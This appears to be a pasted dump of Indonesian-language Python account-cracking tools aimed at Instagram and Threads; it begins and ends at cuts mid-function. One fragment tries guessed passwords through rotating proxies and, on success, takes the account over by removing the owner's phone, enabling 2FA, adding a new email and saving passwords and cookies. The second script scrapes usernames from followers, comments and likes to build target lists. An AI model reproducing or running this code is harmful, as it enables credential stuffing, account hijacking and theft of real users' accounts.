                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecAjax_Threads(username, password)
        for passwd in password:
            try:          
                payload = {
                    'enc_password': Requre().enc_password(passwd),
                    'optIntoOneTap':'false',
                    'queryParams':json.dumps({""hl"":""en""}),
                    'trustedDeviceRecords':'{}',
                    'username': username,
                }
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.threads.net/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'userId' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecAjax_Threads(username, password)
        self.looping+=1
        
"
Zb1gG4mJ,203.78.117.57-/sdcard/instagram.py.py,OBF-XIn,Python,Thursday 7th of March 2024 03:55:22 PM CDT,"# create by ZORA ID 2024

import os, re, sys, json, time, random, datetime, requests
import uuid, hmac, hashlib, urllib, shutil
from enc_password import Requre
from amankan_data import Require
from useragent import Useragent
from facebook import Facebook
from bs4 import BeautifulSoup as bs
from rich.tree import Tree
from rich import print as printz
from rich.panel import Panel
from rich.console import Console
from rich.columns import Columns
from concurrent.futures import ThreadPoolExecutor

dump = []
            
class Requ:
    def __init__(self) -> None:
        self.proxies = []
        pass        
        
    def Convert_Name(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://www.instagram.com/{xxx}/', headers = {""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3""}, cookies={'cookie': cookie}).text
                if 'user_id' in str(response):
                    return(re.findall('""user_id"":""(\d+)""', str(response))[0])
            except (Exception) as e: pass
            
    def Convert_Url(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(xxx, cookies={'cookie': cookie}).text
                if 'media_id' in str(response):
                    return(re.findall('{""media_id"":""(.*?)""',str(response))[0])
            except (Exception) as e: exit(e)

    def Validasi_Username(self, username):
       with requests.Session() as r:
           try:
               response = r.get(""https://i.instagram.com/api/v1/users/web_profile_info/?username={}"".format(username), headers = {""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3""}).json()
               return (response[""data""][""user""][""full_name""], response[""data""][""user""][""edge_followed_by""][""count""], response[""data""][""user""][""edge_follow""][""count""], response[""data""][""user""][""edge_owner_to_timeline_media""][""count""])
           except (Exception) as e: return(None,None,None,None)
        
    def Socksku(self):
        with requests.Session() as r:
            try:
                response = r.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol={}&timeout=100000&country=all&ssl=all&anonymity=all'.format('socks5')).text
                for prox in response.splitlines():
                    self.proxies.append(prox)
                return self.proxies
            except (requests.exceptions.ConnectionError): time.sleep(5); self.Socksku()                 

class Terminal:
    def __init__(self) -> None:
        pass
        
    def Clear_Terminal(self):
        os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
        
    def Banner_Terminal(self):
        self.Clear_Terminal()
        Console(width = 65, style = ""bold grey50"").print(Panel(""""""[bold red]●[bold yellow] ●[bold green] ●[bold white]
[bold red]           _____                 _____  _____)     __  
[bold red]          (, /  |       ,       (, /  /        (__/  ) 
            /---| __      __      /  /   ___     /     
[bold white]         ) /    |_/_)__(_     ___/__/     / ) ) /      
[bold white]        (_/    .-/          (__ /  (____ /   (_/       
              (_/                                            
     [bold white]Version :[bold blue] 2.0[bold white] || Status :[bold green] Premium[bold white] || Type :[bold blue] Hacking""""""))
        return (""Berhasil"")
        
    def Layar_Terminal(self):
        self.get_terminal_size = re.search('columns=(\d+),', str(os.get_terminal_size())).group(1)
        if int(self.get_terminal_size) < 65:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Anda Diwajibkan Untuk Mengecilkan Tampilan Termux Sampai Kotak Ini Terlihat Rapi!...""))
            exit()
        else:
            pass
        
class Login:
    def __init__(self) -> None:
        Terminal().Layar_Terminal()
        pass
        
    def Username_And_Password(self):
        try:
            Terminal().Banner_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silakan Masukan Cookie Instagram, Pastikan Akun Tidak Limite!"", subtitle = ""╭─────"", subtitle_align = ""left""))
            cookies = Console().input(""[bold grey50]   ╰─> "")
            if len(cookies) >0:
                self.username,  self.fullname = self.Validasi_Cookies(cookies)
                with open('Cookie_Instagram.json', 'w') as wr:
                    wr.write(json.dumps({
                        ""Cookie"": cookies,
                    }))
                    wr.close()
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Selamat Datang [green]{self.username}/{self.fullname}[white], Jalankan Ulang Perintahnya!!...""))
                exit()
            else:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Masukan Cookie Instagram, Masukan Dengan Benar, Jangan Kosong Ngab!!...""))
                exit()
        except (KeyboardInterrupt, Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Opss, Cookies Salah, Exspired Atau Limite, Silakan Ganti Akun Tumbal, Di Sarankan Membuat Akun Baru!"")) 
            exit()     
        
    def Validasi_Cookies(self, cookies):
        with requests.Session() as r:
            r.headers.update({
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
            })
            response = r.get('https://i.instagram.com/api/v1/users/{}/info/'.format(re.findall('ds_user_id=(\d+)',str(cookies))[0]), cookies = {
                'cookie': cookies
            })
            self.payload = json.loads(response.text)
            if '\'username\':' in str(self.payload):
                self.username = self.payload['user']['username']
                self.fullname = self.payload['user']['full_name']
                return(self.username, self.fullname)
            else:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Opss, Cookies Exspired Atau Limite, Silakan Ganti Akun Tumbal, Di Sarankan Membuat Akun Baru!""))
                time.sleep(3.5)
                self.Username_And_Password()
                
class Instagram:
    def __init__(self):
        self.Kilometers, self.Meterans, self.amankan_akun = [],[],[]
        self.success, self.chekpoint, self.faktor, self.looping = 0,0,0,0

    def Remove_Cookie(self):
        try: os.system('rm -rf Cookie_Instagram.json')
        except (Exception): pass
        Login().Username_And_Password() 

    def Chek_Cookies(self, created, exspired, sisa):
        try:
           cookie = json.loads(open('Cookie_Instagram.json', 'r').read())['Cookie']
           self.Menu_Instagram(created, exspired, sisa, cookie)          
        except (FileNotFoundError) as e:
           Terminal().Clear_Terminal()
           Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
           Console().input(""[bold grey50]   ╰─> File Not Found Error!!.."")
           self.Remove_Cookie()
           
    def Menu_Instagram(self, created, exspired, sisa, cookie):
        try:
            self.username, self.fullname = Login().Validasi_Cookies(cookie)
        except (KeyError) as e:
            Terminal().Clear_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Console().input(""[bold grey50]   ╰─> Terjadi Kesalahan, Cookie Exspired Atau Limite!!.."")
            self.Remove_Cookie() 
            
        except (requests.exceptions.ConnectionError) as e:
            Terminal().Clear_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Console().input(""[bold grey50]   ╰─> Terjadi Kesalahan, Koneksi Anda Error!!.."")
            self.Chek_Cookies()
        try:                     
            Terminal().Banner_Terminal() 
            self.Kilometers.append(Panel(f'[bold green]•[bold white] Username [bold green]{self.username}\n[bold green]•[bold white] Fullname [bold green]{self.fullname}', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Info Akun) [bold green]<[bold yellow]<[bold red]<',width=32, style='bold grey50'))
            self.Kilometers.append(Panel(f'[bold green]•[bold white] Bergabung [bold green]{created}\n[bold green]•[bold white] Expired [bold green]{exspired} [bold yellow]{sisa}[bold white] hari', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Info License) [bold green]<[bold yellow]<[bold red]<',width=32, style='bold grey50'))
            Console().print(Columns(self.Kilometers))
        except (AttributeError) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()
        Console(width = 65, style = ""bold grey50"").print(Panel('''[bold white][bold green]01[bold white]. Crack Nama Dari Follower\t[bold white][bold green]06[bold white]. Chek Result Crack\n[bold white][bold green]02[bold white]. Crack Nama Dari Followed\t[bold white][bold green]07[bold white]. Beralih Ke Facebook\n[bold white][bold green]03[bold white]. Crack Nama Dari Search\t[bold white][bold green]00[bold red].[bold red] Deleted Cookies\n[bold white][bold green]04[bold white]. Crack Nama Dari Komentar\n[bold white][bold green]05[bold white]. Crack Nama Dari Likes''', subtitle = ""╭─────"", subtitle_align = ""left""))
        query = Console().input(""[bold grey50]   ╰─> "")
        if query == '01' or query == '1':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_Followers(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '02' or query == '2':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_Following(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '03' or query == '3':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    try: self.Dump_Search(self.username, cookie)
                    except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '04' or query == '4':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Url Postingan Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Url(self.username, cookie)
                try: self.Dump_Komentar(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '05' or query == '5':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Url Postingan Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Url(self.username, cookie)
                try: self.Dump_Likers(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '06' or query == '6':
            try:
                Console(width=65).print(Panel('[bold green]01[bold white]. Chek Result OK\n[bold green]02[bold white]. Chek Result 2F\n[bold green]03[bold white]. Chek Result CP',style='bold grey50'), justify='center')
                choose = Console().input(""[bold grey50]   ╰─> "")
                if choose =='01' or choose =='1':
                    try:
                        file = os.listdir('/sdcard/OK')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic green]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File OK) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File OK, Masukan Nama File, Misalnya : [bold green]OK-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                elif choose =='02' or choose =='2':
                    try:
                        file = os.listdir('/sdcard/2F')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File 2F) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File 2F, Masukan Nama File, Misalnya : [bold red]2F-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                elif choose =='03' or choose =='3':
                    try:
                        file = os.listdir('/sdcard/CP')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic yellow]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File CP) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File CP, Masukan Nama File, Misalnya : [bold yellow]CP-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                else:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Menu Instagram!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                    exit()   
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '07' or query == '7':
            try: Facebook()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                              
        elif query == '00' or query == '0':
            try: self.Remove_Cookie()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
        else:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Menu Instagram!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()               
                  
    def Dump_Search(self, username, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query={self.username}&rank_token=0.11856792192547738&include_reel=true',headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie':cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['user']['username']+'<=>'+akun['user']['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(self.username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Search(self.username, cookie)
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass       
            
    def Dump_Followers(self, username, cookie, max_id):
        with requests.Session() as r:
            try:
                params = {'count': '200','max_id': max_id,'search_surface': 'follow_list_page'}
                response = r.get(f'https://www.instagram.com/api/v1/friendships/{username}/followers/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Followers(username, cookie, response['next_max_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Dump_Following(self, username, cookie, max_id):
        with requests.Session() as r:
            try:
                params = {'count': '200','max_id': max_id,'search_surface': 'follow_list_page'}
                response = r.get(f'https://www.instagram.com/api/v1/friendships/{username}/following/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Following(username, cookie, response['next_max_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Dump_Komentar(self, username, cookie, max_min):
        with requests.Session() as r:
            try:
                params = {'can_support_threading':True,'permalink_enabled':False,'min_id': max_min}
